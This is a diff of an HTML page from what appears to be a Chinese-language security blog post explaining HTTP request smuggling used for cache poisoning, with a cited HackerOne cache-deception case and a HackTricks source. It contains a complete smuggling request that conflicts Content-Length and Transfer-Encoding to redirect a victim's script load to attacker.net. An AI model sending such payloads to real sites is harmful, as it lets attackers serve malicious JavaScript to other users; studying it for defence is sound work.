@@ -213,7 +213,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-11-21 23:29:08 / Modified: 23:30:33" itemprop="dateCreated datePublished" datetime="2022-11-21T23:29:08+08:00">2022-11-21</time>
+              <time title="Created: 2022-11-21 23:29:08 / Modified: 23:38:33" itemprop="dateCreated datePublished" datetime="2022-11-21T23:29:08+08:00">2022-11-21</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -289,11 +289,9 @@
 </ol>
 <p>如果 web 站点存在重定向接口，攻击者甚至可以控制客户端加载的 js 文件内容。<br>假设网站有 URI： <code>/post/next?postId=3</code>，访问该 URI 之后，将会被重定向到 <code>/post?postId=4</code>，并且引用 <code>Host</code> 标头作为重定向的目标域。</p>
 <ol>
-<li>攻击者发送 http 走私请求，如下所示：</li>
-</ol>
+<li><p>攻击者发送 http 走私请求，如下所示：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
+</li>
 <li><p>受害客户端通过 <code>GET</code> 请求方式访问 <code>/static/include.js</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
 </li>
@@ -317,6 +315,7 @@
 <blockquote>
 <p>缓存欺骗真实的个案：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/593712">https://hackerone.com/reports/593712</a></p>
 </blockquote>
+<h1 id="From"><a href="#From" class="headerlink" title="From"></a>From</h1><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/cache-deception">https://book.hacktricks.xyz/pentesting-web/cache-deception</a></p>
 
       
     </div>
